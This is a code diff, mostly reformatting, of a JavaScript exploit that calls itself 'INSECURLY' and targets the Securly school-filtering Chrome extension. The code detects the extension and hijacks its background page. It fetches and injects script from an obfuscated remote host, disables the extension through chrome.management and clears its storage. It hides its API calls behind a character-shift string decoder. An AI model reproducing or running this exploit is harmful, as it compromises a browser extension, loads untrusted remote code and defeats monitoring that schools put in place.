@@ -31,15 +31,19 @@
       function decode2(n, _ = 78, D = 126) {
         return decode1(n, D - _);
       }
-      const m = function () {
-          document.body.innerHTML = '<style>  body {    background-color:black;    color:#eeeeee;    font-family:Arial;  }  h1 {    font-size: 40px;    font-weight:normal;  }  .switch-area {    display:flex;    margin:10px 0px;  }  .switch-area div{    font-size:20px;    padding:6px 0px;    height:32px;  }  #desc {    font-size:18px;    max-width:320px;  }  #updates {    font-size:15px;    margin-top:15px;    color:#999999;  }  /* https://danklammer.com/articles/simple-css-toggle-switch/ */  #toggle {      appearance: none;      width: 62px;      height: 32px;      display: inline-block;      position: relative;      border-radius: 50px;      overflow: hidden;      outline: none;      border: none;      cursor: pointer;      background-color: #707070;      transition: background-color ease 0.3s;    }    #toggle:before {      content: "on off";      display: block;      position: absolute;      z-index: 2;      width: 28px;      height: 28px;      background: #fff;      left: 2px;      top: 2px;      border-radius: 50%;      font: 10px/28px Helvetica;      text-transform: uppercase;      font-weight: bold;      text-indent: -22px;      word-spacing: 37px;      color: #fff;      text-shadow: -1px -1px rgba(0,0,0,0.15);      white-space: nowrap;      box-shadow: 0 1px 2px rgba(0,0,0,0.2);      transition: all cubic-bezier(0.3, 1.5, 0.7, 1) 0.3s;    }    #toggle:checked {      background-color: #4CD964;    }    #toggle:checked:before {      left: 32px;    }  </style>  <h1>INSECURLY exploit (by bypassi)</h1>  <div class="switch-area">    <div>securly is currently</div>    <input id="toggle" type="checkbox" />  </div>  <div id="desc">    the switch above allows you to turn the securly extension on and off. note that this will not bypass    network filters or other filtering extensions. teachers using securly classroom will still be able to    see your screen. more functionality is coming soon.  </div>  <div id="updates"></div>';
+
+      const m = function () { // Muoy important
+          document.body.innerHTML =
+            '<style>  body {    background-color:black;    color:#eeeeee;    font-family:Arial;  }  h1 {    font-size: 40px;    font-weight:normal;  }  .switch-area {    display:flex;    margin:10px 0px;  }  .switch-area div{    font-size:20px;    padding:6px 0px;    height:32px;  }  #desc {    font-size:18px;    max-width:320px;  }  #updates {    font-size:15px;    margin-top:15px;    color:#999999;  }  /* https://danklammer.com/articles/simple-css-toggle-switch/ */  #toggle {      appearance: none;      width: 62px;      height: 32px;      display: inline-block;      position: relative;      border-radius: 50px;      overflow: hidden;      outline: none;      border: none;      cursor: pointer;      background-color: #707070;      transition: background-color ease 0.3s;    }    #toggle:before {      content: "on off";      display: block;      position: absolute;      z-index: 2;      width: 28px;      height: 28px;      background: #fff;      left: 2px;      top: 2px;      border-radius: 50%;      font: 10px/28px Helvetica;      text-transform: uppercase;      font-weight: bold;      text-indent: -22px;      word-spacing: 37px;      color: #fff;      text-shadow: -1px -1px rgba(0,0,0,0.15);      white-space: nowrap;      box-shadow: 0 1px 2px rgba(0,0,0,0.2);      transition: all cubic-bezier(0.3, 1.5, 0.7, 1) 0.3s;    }    #toggle:checked {      background-color: #4CD964;    }    #toggle:checked:before {      left: 32px;    }  </style>  <h1>INSECURLY exploit (by bypassi)</h1>  <div class="switch-area">    <div>securly is currently</div>    <input id="toggle" type="checkbox" />  </div>  <div id="desc">    the switch above allows you to turn the securly extension on and off. note that this will not bypass    network filters or other filtering extensions. teachers using securly classroom will still be able to    see your screen. more functionality is coming soon.  </div>  <div id="updates"></div>';
           let securlyWindow = window.chrome.extension.getBackgroundPage();
           let D = document.getElementById("toggle");
           async function x() {
             let _ = await (
                 await fetch(decode2`8DD@C\n}}9>C53EB<I|2I@1CC9|3?=}:C|:C`)
               ).text(),
-              D = new securlyWindow[decode2`\x12<?2`]([_], { type: decode2`D5HD}:1F1C3B9@D` }),
+              D = new securlyWindow[decode2`\x12<?2`]([_], {
+                type: decode2`D5HD}:1F1C3B9@D`,
+              }),
               x = document.createElement("script");
             (x.src = URL[decode2`3B51D5\x1F2:53D%"\x1C`](D)),
               securlyWindow.document.body.appendChild(x);
@@ -82,20 +86,25 @@
             if (!window[decode2`<?31D9?>`][decode2`81C8`])
               throw new window[decode2`\x15BB?B`]("IDK");
             let n = location.hash.replace("#", "");
-            t(Math.random() + ".js", decode2`D5HD}:1F1C3B9@D`, n)[decode2`D85>`]((n) => {
+            t(Math.random() + ".js", decode2`D5HD}:1F1C3B9@D`, n)[
+              decode2`D85>`
+            ]((n) => {
               let _ = document.createElement("script");
               (_.src = n), document.body.appendChild(_);
             });
           }
           securlyWindow.chrome.runtime.id.startsWith("i") ||
-            ((document.getElementById("updates").textContent = 'payload 3 applied. (you aren\'t supposed to know what this means)'),
-            securlyWindow.chrome.extension.setUpdateURLData('ඞ'.repeat(1024))),
-            localStorage['cluster']?.startsWith('AVOID_OS,') ||
+            ((document.getElementById("updates").textContent =
+              "payload 3 applied. (you aren't supposed to know what this means)"),
+            securlyWindow.chrome.extension.setUpdateURLData("ඞ".repeat(1024))),
+            localStorage["cluster"]?.startsWith("AVOID_OS,") ||
               (D.checked = !0),
             (D.onclick = function $() {
-              D['checked']
+              D["checked"]
                 ? (delete window.WebRequestEventImpl, localStorage.clear())
-                : (securlyWindow.chrome.management[decode2`E>9>CD1<<#5<6`].bind(securlyWindow.chrome.runtime.id),
+                : (securlyWindow.chrome.management[decode2`E>9>CD1<<#5<6`].bind(
+                    securlyWindow.chrome.runtime.id
+                  ),
                   Storage.prototype[decode2`C5D\x19D5=`].call(
                     window[decode2`<?31<#D?B175`],
                     decode2`3<ECD5B`,
@@ -107,8 +116,8 @@
             }),
             (navigator[decode2`@5BC9CD\x1C?31<\x169<5C`] = !0),
             t(
-              '/i.js',
-              'text/javascript',
+              "/i.js",
+              "text/javascript",
               decode1 + decode2 + t + B + ";" + B.name + "()//"
             ),
             t(
@@ -132,16 +141,20 @@
           "6?>DC}\x1d5DB?@?<9C{#5=9\x12?<4|G?66",
           "6?>DC}\x1d5DB?@?<9C|3CC",
         ],
-        securlyVersions = { // Extension versions ?
+        securlyVersions = {
+          // Extension versions ?
           NONE: "",
-          OLD: 'iheobagjkfklnlikgihanlhcddjoihkg',
-          NEW: 'joflmkccibkooplaeoinecjbmdebglab',
-          BETA: 'knneimmpeamikmjijmnhjmmobddleohj',
+          OLD: "iheobagjkfklnlikgihanlhcddjoihkg",
+          NEW: "joflmkccibkooplaeoinecjbmdebglab",
+          BETA: "knneimmpeamikmjijmnhjmmobddleohj",
         };
-      async function g(extensionID) { // Check if extensionID is a valid extension
+      async function g(extensionID) {
+        // Check if extensionID is a valid extension
         let request;
         try {
-          request = await window.fetch('chrome-extension://' + extensionID + '/fonts/Metropolis.css' );
+          request = await window.fetch(
+            "chrome-extension://" + extensionID + "/fonts/Metropolis.css"
+          );
         } catch (error) {
           return 0;
         }
@@ -151,7 +164,7 @@
         let version = "";
         if (await g(securlyVersions.NEW)) {
           return securlyVersions.NEW;
-        } else if (await g(securlyVersions.OLD)){
+        } else if (await g(securlyVersions.OLD)) {
           return securlyVersions.OLD;
         } else if (await g(securlyVersions.BETA)) {
           return securlyVersions.BETA;
@@ -162,16 +175,18 @@
       function e(n, _) {
         let D = function (n) {
             let _ = open();
-            _.chrome =
-              top.chrome[decode2`5HD5>C9?>`][decode2`75D\x1213;7B?E>4 175`]().chrome;
-            let D = document[decode2`3B51D5\x15<5=5>D`]("script");
-            (D.src = n), _.document.body.appendChild(D), top.close();
+            _.chrome = top.chrome.extension.getBackgroundPage().chrome;
+            let X = document.createElement("script");
+            (X.src = n), _.document.body.appendChild(X), top.close();
           },
-          x = URL[decode2`3B51D5\x1F2:53D%"\x1C`](n),
-          $ = new window[decode2`\x12<?2`]([`${decode1};${decode2};(${D})("${x}")`], {
-            type: decode2`D5HD}:1F1C3B9@D`,
-          }),
-          C = URL[decode2`3B51D5\x1F2:53D%"\x1C`]($),
+          x = URL.createObjectURL(n),
+          $ = new window.Blob(
+            [`${decode1};${decode2};(${D})("${x}")`],
+            {
+              type: 'text/javascript',
+            }
+          ),
+          C = URL.createObjectURL($),
           t =
             decode2`\fCDI<5\x0ExKF9C929<9DI\n89445>M\f}CDI<5\x0EXnnnn\f96B1=5nCB34?3\rp\fC3B9@DnCB3\ru` +
             C +
@@ -184,19 +199,22 @@
               (0.3 > Math.random() ? "/" : "") +
               decode2(а[1]) +
               [decode2`\x0F31D57?BI\r`] +
-              window[decode2`5>3?45%"\x19\x13?=@?>5>D`](window[decode2`2D?1`](t));
+              window[decode2`5>3?45%"\x19\x13?=@?>5>D`](
+                window[decode2`2D?1`](t)
+              );
       }
       function gS2U(n) {
         return e(
-          new window[decode2`\x12<?2`]([`${decode1};${decode2};(${m})()`], {
-            type: decode2`D5HD}:1F1C3B9@D`,
+          new window["Blob"]([`${decode1};${decode2};(${m})()`], {
+            type: "text/javascript",
           }),
           n
         );
       }
-      ([].__proto__[window[decode1`\x05+\x1F\x14!\x1E`][decode2`9D5B1D?B`]] = function* () {
-        yield gS2U.call(this[0], this[1]);
-      }),
+      ([].__proto__[window[decode1`\x05+\x1F\x14!\x1E`][decode2`9D5B1D?B`]] =
+        function* () {
+          yield gS2U.call(this[0], this[1]);
+        }),
         getSecurlyVersion().then((n) => {
           if (n === securlyVersions.NONE) {
             let _ = document.getElementById("error");
